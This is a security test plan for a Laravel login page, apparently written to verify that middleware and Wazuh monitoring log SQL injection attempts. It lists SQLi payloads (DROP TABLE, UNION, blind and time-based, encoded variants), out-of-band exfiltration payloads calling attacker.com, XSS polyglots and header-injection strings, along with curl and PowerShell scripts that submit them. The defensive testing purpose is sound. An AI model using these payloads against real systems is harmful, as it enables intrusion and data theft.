# Advanced SQL Injection Test Cases

## Purpose
Test SQL injection detection in scenarios where basic email validation passes.

## ⚠️ Important Note
These tests are designed to verify that your **security monitoring detects SQL injection patterns even in valid-looking emails**. Due to Laravel's Eloquent ORM, actual SQL injection is not possible, but these tests verify that attempts are logged and detected.

---

## Test Category 1: Valid Email Format with SQL Patterns

### Purpose
Test if middleware catches SQL injection when the input passes email validation.

| Test Case | Email | Password | Expected Result |
|-----------|-------|----------|-----------------|
| **1.1** | `test@example.com'; DROP TABLE users--` | `anything` | Middleware blocks OR logs warning |
| **1.2** | `admin@test.com' OR '1'='1` | `anything` | Middleware blocks OR logs warning |
| **1.3** | `user@domain.com' UNION SELECT NULL--` | `anything` | Middleware blocks OR logs warning |
| **1.4** | `valid@email.com';--` | `anything` | Middleware blocks OR logs warning |
| **1.5** | `test@example.com' AND 1=1--` | `anything` | Middleware blocks OR logs warning |

### How to Test

```powershell
# Test via curl
curl -X POST "https://your-ngrok-url.ngrok.io/login" `
  -d "email=test@example.com'; DROP TABLE users--" `
  -d "password=test123"
```

### Expected Behavior

**Option A: Middleware Catches It**
- Response: `403 Forbidden`
- Laravel log: `SQLI_DETECTED`
- Wazuh alert: Level 12 security event

**Option B: Passes to Application Logic**
- Response: `422 Validation Error` (credentials don't match)
- Laravel log: `LOGIN_ATTEMPT` and `LOGIN_FAILED`
- No SQL injection occurs (Eloquent protection)
- Security monitoring may still log suspicious pattern

**Note:** Even if option B occurs, **no actual SQL injection is possible** due to Eloquent's parameterized queries.

---

## Test Category 2: Email Validation Bypass Attempts

### Purpose
Test edge cases in email validation.

| Test Case | Email | Notes |
|-----------|-------|-------|
| **2.1** | `admin@localhost';--` | Valid email, SQL pattern |
| **2.2** | `"admin' OR 1=1"@example.com` | Quoted local-part (RFC valid) |
| **2.3** | `test+inject@example.com'; DROP--` | Plus addressing with injection |
| **2.4** | `user%27@example.com` | URL-encoded quote in username |
| **2.5** | `admin@[127.0.0.1]';--` | IP address domain with injection |

### RFC 5322 Valid But Suspicious Emails

```
"test'OR'1"@example.com
admin@example.com(comment);DROP TABLE users--
user..name@example.com';--
```

---

## Test Category 3: Encoded Payloads

### Purpose
Test if detection catches encoded SQL injection attempts.

| Test Case | Payload | Encoding Type |
|-----------|---------|---------------|
| **3.1** | `admin%27%20OR%20%271%27%3D%271` | URL Encoded |
| **3.2** | `admin' /*comment*/ OR '1'='1` | SQL Comment Obfuscation |
| **3.3** | `admin' /*!50000OR*/ '1'='1` | MySQL Version Comment |
| **3.4** | `admin' %00OR%00 '1'='1` | Null Byte Injection |
| **3.5** | `admin\' OR \'1\'=\'1` | Escaped Quotes |

### Test Script

```python
import urllib.parse

payloads = [
    "admin' OR '1'='1",
    "admin'; DROP TABLE users--",
    "admin' UNION SELECT NULL--"
]

for payload in payloads:
    encoded = urllib.parse.quote(payload)
    print(f"Original: {payload}")
    print(f"Encoded:  {encoded}")
    print()
```

---

## Test Category 4: Case & Whitespace Variations

### Purpose
Test if pattern matching is case-insensitive and handles whitespace.

| Test Case | Email | Pattern Type |
|-----------|-------|--------------|
| **4.1** | `admin' Or '1'='1` | Mixed case keywords |
| **4.2** | `admin'  OR  '1'='1` | Double spaces |
| **4.3** | `admin'OR'1'='1` | No spaces |
| **4.4** | `admin' oR '1'='1` | Lowercase keywords |
| **4.5** | `admin' /**/OR/**/ '1'='1` | Comment spaces |
| **4.6** | `admin'	OR	'1'='1` | Tab characters |

---

## Test Category 5: Password Field SQL Injection

### Purpose
Most tests focus on email. Password field should also be tested.

| Test Case | Email | Password | Notes |
|-----------|-------|----------|-------|
| **5.1** | `admin@test.com` | `' OR '1'='1` | SQLi in password |
| **5.2** | `admin@test.com` | `admin'--` | Comment injection |
| **5.3** | `admin@test.com` | `' UNION SELECT NULL--` | UNION in password |
| **5.4** | `admin@test.com` | `'; DROP TABLE users--` | DROP in password |

### Why Test Password?

Your middleware checks **all input**:
```php
$input = $request->all();
```

SecurityMonitoringService also inspects password:
```php
SecurityMonitoringService::inspectLoginPayload($this->email, $this->password);
```

---

## Test Category 6: Second-Order SQL Injection

### Purpose
Test if malicious data stored and later used unsafely.

### Scenario
1. Register with email: `test@example.com'; DROP TABLE--`
2. System stores it in database (safely via Eloquent)
3. Later, admin views user list
4. If user list uses raw SQL, injection might trigger

### Test Steps

```bash
# 1. Register malicious email (if registration is open)
curl -X POST "https://your-url.ngrok.io/register" \
  -d "email=test@example.com'; DROP TABLE users--" \
  -d "password=test123"

# 2. Login as admin
# 3. Navigate to user management
# 4. Check if SQLi triggers when viewing users
```

**Expected:** No injection occurs due to Eloquent protection throughout.

---

## Test Category 7: Time-Based Blind SQL Injection

### Purpose
Test detection of time-delay attempts.

| Test Case | Email | Expected |
|-----------|-------|----------|
| **7.1** | `admin@test.com' AND SLEEP(5)--` | Blocked or detected |
| **7.2** | `admin@test.com' WAITFOR DELAY '00:00:05'--` | Blocked (SQL Server) |
| **7.3** | `admin@test.com' BENCHMARK(10000000,MD5('a'))--` | Blocked (MySQL) |
| **7.4** | `admin@test.com' pg_sleep(5)--` | Blocked (PostgreSQL) |

**Note:** Even if these pass validation, Eloquent prevents execution.

---

## Test Category 8: Boolean-Based Blind SQL Injection

### Purpose
Test conditional logic injection attempts.

```
admin@test.com' AND 1=1--
admin@test.com' AND 1=2--
admin@test.com' AND 'a'='a--
admin@test.com' AND 'a'='b--
```

**Expected Behavior:**
- Both queries should fail identically
- No timing differences
- No information disclosure

---

## Test Category 9: Out-of-Band SQL Injection

### Purpose
Test DNS/HTTP exfiltration attempts.

```sql
admin@test.com'; EXEC master..xp_dirtree '\\attacker.com\share'--
admin@test.com' UNION SELECT LOAD_FILE('\\\\attacker.com\\share')--
```

**Expected:** Blocked by middleware, never reaches database.

---

## Test Category 10: Polyglot Payloads

### Purpose
Test payloads that work across multiple contexts.

```
admin@test.com'">><script>alert(1)</script>
admin@test.com' OR '1'='1'--
admin@test.com' UNION SELECT '<script>alert(1)</script>'--
```

**Tests Both:**
- SQL injection detection
- XSS detection

---

## Automated Testing Script

Save as `test-advanced-sqli.ps1`:

```powershell
param(
    [string]$BaseUrl = "http://localhost:8000"
)

$advancedPayloads = @(
    @{name="Valid email with DROP"; email="test@example.com'; DROP TABLE users--"; password="test"},
    @{name="Valid email with OR"; email="admin@test.com' OR '1'='1"; password="test"},
    @{name="Valid email with UNION"; email="user@domain.com' UNION SELECT NULL--"; password="test"},
    @{name="Encoded single quote"; email="admin%27@example.com"; password="test"},
    @{name="Mixed case SQLi"; email="admin@test.com' Or '1'='1"; password="test"},
    @{name="Password field SQLi"; email="admin@test.com"; password="' OR '1'='1"},
    @{name="Comment obfuscation"; email="admin@test.com' /*comment*/ OR '1'='1"; password="test"},
    @{name="Time-based attempt"; email="admin@test.com' AND SLEEP(5)--"; password="test"}
)

Write-Host "Advanced SQL Injection Tests" -ForegroundColor Cyan
Write-Host "Testing against: $BaseUrl" -ForegroundColor White
Write-Host ""

foreach ($test in $advancedPayloads) {
    Write-Host "Testing: $($test.name)" -ForegroundColor Yellow
    
    try {
        $response = Invoke-WebRequest `
            -Uri "$BaseUrl/login" `
            -Method POST `
            -Body @{email=$test.email; password=$test.password} `
            -UseBasicParsing `
            -ErrorAction Stop
        
        if ($response.StatusCode -eq 422) {
            Write-Host "  ⚠️  Validation error (expected for some tests)" -ForegroundColor Yellow
        } else {
            Write-Host "  ❌ Unexpected status: $($response.StatusCode)" -ForegroundColor Red
        }
    } catch {
        $statusCode = $_.Exception.Response.StatusCode.value__
        if ($statusCode -eq 403) {
            Write-Host "  ✅ Blocked by middleware (403)" -ForegroundColor Green
        } elseif ($statusCode -eq 422) {
            Write-Host "  ⚠️  Validation error (422)" -ForegroundColor Yellow
        } else {
            Write-Host "  ⚠️  Status: $statusCode" -ForegroundColor Yellow
        }
    }
    Start-Sleep -Milliseconds 300
}

Write-Host ""
Write-Host "Check Laravel logs for SQLI_DETECTED warnings:" -ForegroundColor Cyan
Write-Host "type storage\logs\laravel.log | findstr /i SQLI_DETECTED" -ForegroundColor Gray
```

---

## Expected Results Summary

### What SHOULD Happen

| Input Type | Expected Behavior | Why |
|------------|------------------|-----|
| Invalid email format SQLi | ❌ Validation fails | Laravel validation |
| Valid email format SQLi | ⚠️ Passes validation, logged as suspicious | SecurityMonitoringService |
| SQLi reaching database | ✅ No injection occurs | Eloquent parameterized queries |
| Middleware detection | ✅ 403 Forbidden | WazuhSecurityMonitor |

### Security Layers Working Correctly

```
Input: "admin@test.com'; DROP TABLE users--"
    ↓
Layer 1: Laravel Validation
    ├─ Is valid email? ❌ NO (contains SQL chars)
    └─ Result: 422 Validation Error
    
Input: "test@example.com"  (legitimate)
    ↓
Layer 1: Laravel Validation ✅ PASS
    ↓
Layer 2: WazuhSecurityMonitor ✅ PASS (no SQL patterns)
    ↓
Layer 3: SecurityMonitoringService (logs attempt)
    ↓
Layer 4: Eloquent ORM
    Query: SELECT * FROM users WHERE email = ? 
    Params: ["test@example.com"]
    Result: ✅ Safe parameterized query
```

---

## Real-World Attack Vectors (Educational)

### Attack Vector 1: Email Header Injection
```
admin@test.com%0ACc:attacker@evil.com
```
**Purpose:** Try to inject email headers, not SQL

### Attack Vector 2: LDAP Injection
```
admin@test.com*)(|(password=*)
```
**Purpose:** If app uses LDAP for auth

### Attack Vector 3: NoSQL Injection
```json
{
  "email": {"$gt": ""},
  "password": {"$gt": ""}
}
```
**Purpose:** If using MongoDB (not applicable to your SQL setup)

---

## Conclusion

### What You'll Find:

1. **Traditional SQL injection (e.g., `admin'--`) WILL FAIL** due to email validation
2. **Valid-looking emails with SQL patterns** might pass validation but:
   - Will be logged by SecurityMonitoringService
   - May be blocked by WazuhSecurityMonitor middleware
   - Will NOT cause SQL injection (Eloquent protection)
3. **Your application has multiple defense layers**, making actual SQL injection extremely difficult

### Recommended Tests:

Focus on testing **detection and logging**, not actual exploitation:
- ✅ Verify middleware blocks obvious patterns
- ✅ Verify SecurityMonitoringService logs suspicious inputs
- ✅ Verify Wazuh alerts are created
- ✅ Verify AI Security Reports displays attempts

### Bottom Line:

**You cannot actually exploit SQL injection in this application**, but you can (and should) verify that **attack attempts are detected and logged** properly.

---

**Document Version:** 1.0  
**Last Updated:** June 18, 2026  
**Purpose:** Penetration testing education and security verification
